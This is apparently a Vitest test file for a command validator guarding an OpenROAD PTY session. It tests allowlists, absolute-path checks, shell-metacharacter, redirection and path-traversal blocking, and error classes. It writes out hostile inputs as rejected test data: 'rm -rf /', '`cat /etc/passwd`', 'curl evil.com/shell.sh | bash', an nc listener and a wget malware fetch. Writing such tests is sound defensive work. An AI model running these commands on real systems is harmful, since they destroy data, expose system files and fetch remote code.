import { describe, it, expect, afterEach, vi } from "vitest";
import {
  PTYError,
  SessionError,
  SessionNotFoundError,
  SessionTerminatedError,
  CommandBlockedError,
} from "../../src/interactive/models.js";
import { PtyHandler } from "../../src/interactive/pty_handler.js";
import { Settings } from "../../src/config/settings.js";

vi.mock("node-pty", () => ({ spawn: vi.fn() }));

afterEach(() => vi.unstubAllEnvs());

function makeHandler(overrides: Partial<Settings> = {}) {
  return new PtyHandler(new Settings(overrides));
}

describe("command validation", () => {
  describe("allowed commands", () => {
    it("passes for allowed command", () => {
      makeHandler().validateCommand(["openroad", "-no_init"]);
    });

    it("throws for absolute path even if basename matches an allowed command", () => {
      expect(() => makeHandler().validateCommand(["/usr/bin/openroad", "-no_init"])).toThrow(PTYError);
      expect(() => makeHandler().validateCommand(["/usr/bin/openroad", "-no_init"])).toThrow("absolute path");
    });

    it("passes for valid flags and file arguments", () => {
      makeHandler().validateCommand(["openroad", "-no_init", "script.tcl"]);
      makeHandler().validateCommand(["openroad", "-cmd", "read_lef design.lef"]);
      makeHandler().validateCommand(["openroad", "-no_init", "-exit"]);
    });

    it("throws on empty command list", () => {
      expect(() => makeHandler().validateCommand([])).toThrow(PTYError);
      expect(() => makeHandler().validateCommand([])).toThrow("Command list cannot be empty");
    });

    it("throws for disallowed plain command", () => {
      expect(() => makeHandler().validateCommand(["python"])).toThrow(
        "not in the allowed commands list",
      );
      expect(() => makeHandler().validateCommand(["sh"])).toThrow("not in the allowed commands list");
    });

    it("throws for absolute path to disallowed command (absolute path check fires first)", () => {
      expect(() => makeHandler().validateCommand(["/bin/bash", "-c", "echo hello"])).toThrow(
        "absolute path",
      );
    });
  });

  describe("shell metacharacter detection", () => {
    it("blocks semicolon", () => {
      expect(() =>
        makeHandler().validateCommand(["openroad", "-cmd", "read_lef; exit"]),
      ).toThrow("contains shell metacharacters");
    });

    it("blocks pipe", () => {
      expect(() =>
        makeHandler().validateCommand(["openroad", "-cmd", "read_lef | grep design"]),
      ).toThrow("contains shell metacharacters");
    });

    it("blocks ampersand", () => {
      expect(() =>
        makeHandler().validateCommand(["openroad", "-cmd", "read_lef & exit"]),
      ).toThrow("contains shell metacharacters");
    });

    it("blocks dollar sign", () => {
      expect(() => makeHandler().validateCommand(["openroad", "$INJECTION"])).toThrow(
        "contains shell metacharacters",
      );
    });

    it("blocks backtick", () => {
      expect(() => makeHandler().validateCommand(["openroad", "`whoami`"])).toThrow(
        "contains shell metacharacters",
      );
    });

    it("blocks newline", () => {
      expect(() => makeHandler().validateCommand(["openroad", "arg1\nexit"])).toThrow(
        "contains shell metacharacters",
      );
    });

    it("blocks carriage return", () => {
      expect(() => makeHandler().validateCommand(["openroad", "arg1\rexit"])).toThrow(
        "contains shell metacharacters",
      );
    });
  });

  describe("redirection operator detection", () => {
    it("blocks output redirection", () => {
      expect(() => makeHandler().validateCommand(["openroad", ">output.txt"])).toThrow(
        "contains redirection operators",
      );
    });

    it("blocks input redirection", () => {
      expect(() => makeHandler().validateCommand(["openroad", "<input.txt"])).toThrow(
        "contains redirection operators",
      );
    });

    it("blocks append redirection", () => {
      expect(() => makeHandler().validateCommand(["openroad", ">>output.txt"])).toThrow(
        "contains redirection operators",
      );
    });
  });

  describe("settings injection", () => {
    it("skips validation when ENABLE_COMMAND_VALIDATION is false", () => {
      const handler = makeHandler({ ENABLE_COMMAND_VALIDATION: false });
      handler.validateCommand(["/bin/bash", "-c", "echo hello"]);
    });

    it("respects custom ALLOWED_COMMANDS list", () => {
      const handler = makeHandler({
        ENABLE_COMMAND_VALIDATION: true,
        ALLOWED_COMMANDS: ["openroad", "python", "custom_tool"],
      });

      handler.validateCommand(["python", "script.py"]);
      handler.validateCommand(["custom_tool", "--arg"]);

      expect(() => handler.validateCommand(["bash", "-c", "echo"])).toThrow(
        "not in the allowed commands list",
      );
    });
  });
});

describe("command injection prevention", () => {
  it("blocks command chaining via semicolon", () => {
    expect(() =>
      makeHandler().validateCommand(["openroad", "-cmd", "read_lef design.lef; rm -rf /"]),
    ).toThrow(PTYError);
  });

  it("blocks command substitution with backticks", () => {
    expect(() =>
      makeHandler().validateCommand(["openroad", "`cat /etc/passwd`"]),
    ).toThrow(PTYError);
  });

  it("blocks $() command substitution", () => {
    expect(() =>
      makeHandler().validateCommand(["openroad", "$(whoami)"]),
    ).toThrow(PTYError);
  });

  it("blocks background execution via &", () => {
    expect(() =>
      makeHandler().validateCommand(["openroad", "script.tcl &"]),
    ).toThrow(PTYError);
  });

  it("blocks piping to a shell", () => {
    expect(() =>
      makeHandler().validateCommand(["openroad", "| /bin/bash"]),
    ).toThrow(PTYError);
  });

  it("blocks executing arbitrary binaries", () => {
    // Absolute paths are caught by the absolute-path guard (fires before allowlist check)
    expect(() =>
      makeHandler().validateCommand(["/bin/bash", "-c", "curl evil.com/shell.sh | bash"]),
    ).toThrow("absolute path");

    expect(() =>
      makeHandler().validateCommand(["/usr/bin/nc", "-l", "4444"]),
    ).toThrow("absolute path");

    // Plain binary names not in the allowlist are caught by the allowlist check
    expect(() =>
      makeHandler().validateCommand(["wget", "http://evil.com/malware"]),
    ).toThrow("not in the allowed commands list");
  });

  it("blocks file overwrite via redirection", () => {
    expect(() =>
      makeHandler().validateCommand(["openroad", ">sensitive_file.txt"]),
    ).toThrow(PTYError);
  });

  it("blocks path traversal in script argument", () => {
    expect(() =>
      makeHandler().validateCommand(["openroad", "-script", "../../etc/malicious.tcl"]),
    ).toThrow("contains path traversal");
    expect(() =>
      makeHandler().validateCommand(["openroad", "-script", "../sibling.tcl"]),
    ).toThrow("contains path traversal");
    expect(() =>
      makeHandler().validateCommand(["openroad", ".."]),
    ).toThrow("contains path traversal");
  });

  it("passes for legitimate relative and nested paths without traversal", () => {
    makeHandler().validateCommand(["openroad", "scripts/design.tcl"]);
    makeHandler().validateCommand(["openroad", "-script", "design.tcl"]);
    makeHandler().validateCommand(["openroad", "file..name.tcl"]);
  });
});

describe("environment variable configuration", () => {
  it("reads single allowed command from OPENROAD_ALLOWED_COMMANDS", () => {
    vi.stubEnv("OPENROAD_ALLOWED_COMMANDS", "openroad");
    const s = Settings.fromEnv();
    expect(s.ALLOWED_COMMANDS).toEqual(["openroad"]);
  });

  it("reads multiple allowed commands separated by commas", () => {
    vi.stubEnv("OPENROAD_ALLOWED_COMMANDS", "openroad, sta, or");
    const s = Settings.fromEnv();
    expect(s.ALLOWED_COMMANDS).toEqual(["openroad", "sta", "or"]);
  });

  it("trims whitespace around each command", () => {
    vi.stubEnv("OPENROAD_ALLOWED_COMMANDS", "openroad ,  sta  , or");
    const s = Settings.fromEnv();
    expect(s.ALLOWED_COMMANDS).toEqual(["openroad", "sta", "or"]);
  });

  it("disables validation when OPENROAD_ENABLE_COMMAND_VALIDATION=false", () => {
    vi.stubEnv("OPENROAD_ENABLE_COMMAND_VALIDATION", "false");
    const s = Settings.fromEnv();
    expect(s.ENABLE_COMMAND_VALIDATION).toBe(false);
  });

  it.each(["false", "False", "0", "no", "No"])(
    "disables validation for falsy value %s",
    (value) => {
      vi.stubEnv("OPENROAD_ENABLE_COMMAND_VALIDATION", value);
      const s = Settings.fromEnv();
      expect(s.ENABLE_COMMAND_VALIDATION).toBe(false);
    },
  );

  it.each(["true", "True", "1", "yes", "Yes"])(
    "enables validation for truthy value %s",
    (value) => {
      vi.stubEnv("OPENROAD_ENABLE_COMMAND_VALIDATION", value);
      const s = Settings.fromEnv();
      expect(s.ENABLE_COMMAND_VALIDATION).toBe(true);
    },
  );

  it("defaults to openroad in allowed commands", () => {
    const s = new Settings();
    expect(s.ALLOWED_COMMANDS).toContain("openroad");
  });

  it("defaults validation to enabled", () => {
    const s = new Settings();
    expect(s.ENABLE_COMMAND_VALIDATION).toBe(true);
  });
});

describe("interactive error models", () => {
  describe("SessionError", () => {
    it("stores sessionId and sets name", () => {
      const e = new SessionError("something went wrong", "sess-1");
      expect(e.message).toBe("something went wrong");
      expect(e.sessionId).toBe("sess-1");
      expect(e.name).toBe("SessionError");
      expect(e).toBeInstanceOf(Error);
    });

    it("sessionId is optional", () => {
      const e = new SessionError("no id");
      expect(e.sessionId).toBeUndefined();
    });
  });

  describe("SessionNotFoundError", () => {
    it("is a SessionError with correct name", () => {
      const e = new SessionNotFoundError("session abc not found", "abc");
      expect(e.name).toBe("SessionNotFoundError");
      expect(e.sessionId).toBe("abc");
      expect(e).toBeInstanceOf(SessionError);
    });
  });

  describe("SessionTerminatedError", () => {
    it("is a SessionError with correct name", () => {
      const e = new SessionTerminatedError("session terminated", "xyz");
      expect(e.name).toBe("SessionTerminatedError");
      expect(e.sessionId).toBe("xyz");
      expect(e).toBeInstanceOf(SessionError);
    });
  });

  describe("CommandBlockedError", () => {
    it("formats message with command verb and stores commandVerb", () => {
      const e = new CommandBlockedError("bash", "sess-2");
      expect(e.message).toContain("'bash' is not allowed");
      expect(e.message).toContain("OpenROAD");
      expect(e.commandVerb).toBe("bash");
      expect(e.sessionId).toBe("sess-2");
      expect(e.name).toBe("CommandBlockedError");
      expect(e).toBeInstanceOf(SessionError);
    });
  });

  describe("PTYError", () => {
    it("is an Error with correct name", () => {
      const e = new PTYError("pty failed");
      expect(e.message).toBe("pty failed");
      expect(e.name).toBe("PTYError");
      expect(e).toBeInstanceOf(Error);
    });
  });
});
